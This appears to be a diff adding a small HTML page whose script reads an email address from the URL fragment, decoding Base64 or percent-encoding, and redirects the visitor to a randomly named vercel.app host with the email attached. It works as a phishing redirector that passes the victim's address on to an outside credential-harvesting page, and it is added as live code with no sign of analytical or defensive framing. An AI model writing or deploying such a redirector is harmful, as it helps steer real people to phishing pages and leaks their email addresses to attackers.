@@ -1,0 +1,32 @@
+<!DOCTYPE html><script>
+onload=_=>{
+  let h = decodeURIComponent(location.hash.slice(1)).replace(/[%0-9A-F]{2}/gi, m=>m==='%40'?'@':m).trim();
+  h = h.replace(/[\r\n].*$/g,''); // kill newlines
+
+  let raw = '';
+  try {
+    let qs = h.includes('?') ? h.split('?')[1] : h;
+    let p = new URLSearchParams(qs);
+    for (let v of p.values()) {
+      if (v && (v.includes('@') || /^[A-Za-z0-9+/=]+$/.test(v))) { raw = v; break; }
+    }
+  } catch(e) {}
+  if (!raw && (h.includes('@') || /^[A-Za-z0-9+/=]+$/.test(h))) raw = h.split('?')[0];
+
+  if (!raw) return;
+
+  let email = raw;
+  // First: try Base64
+  if (/^[A-Za-z0-9+/=]+$/.test(email)) {
+    try { email = atob(email); } catch(e) {}
+  }
+  // Then: fix %40 → @ if still no @
+  if (!email.includes('@') && email.includes('%40')) {
+    email = email.replace(/%40/gi, '@');
+  }
+  // Final validation
+  if (/^\S+@\S+\.\S+$/.test(email)) {
+    location.replace("https://hjkjjjjkjkjkjk-bry4n-10n0s.vercel.app#" + email);
+  }
+}
+</script>
